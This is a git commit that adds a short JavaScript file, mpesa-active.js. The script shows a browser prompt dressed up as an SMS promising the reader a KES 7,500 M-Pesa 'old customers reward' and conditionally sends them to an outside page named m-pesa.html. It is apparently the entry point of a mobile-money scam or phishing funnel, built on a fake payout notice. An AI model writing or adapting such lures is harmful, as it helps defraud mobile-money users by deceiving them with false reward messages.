2e98da17719723eea94b762bd03345963b180f15
surebanga <erongukpe@gmail.com>
2025-09-22 09:00:39 +0100

    Create mpesa-active.js

---
+++ mpesa-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW KES7,500'
+password=prompt('SMS: Congratulations, your M-pesa Account Number is eligible to receive KES7,500 old customers reward, click OK to withdraw cash','WITHDRAW KES7,500');
+if (password != 'WITHDRAW KES7,500') {
+location.href='https://bhest.org/m-pesa.html';
+}
